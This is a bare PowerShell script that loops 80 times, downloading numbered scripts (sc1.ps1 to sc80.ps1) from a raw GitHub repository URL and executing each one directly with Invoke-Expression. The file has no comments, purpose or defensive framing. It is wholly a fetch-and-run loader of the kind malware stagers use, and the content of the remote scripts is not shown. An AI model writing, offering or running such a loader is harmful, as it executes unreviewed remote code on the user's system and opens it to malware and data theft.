for ($i = 1; $i -le 80; $i++) {
   
    $url = "https://raw.githubusercontent.com/jia891/test/refs/heads/main/sc$i.ps1"
    
    
    $webClient = New-Object System.Net.WebClient
    $scriptContent = $webClient.DownloadString($url)
    
    
    Invoke-Expression $scriptContent

}
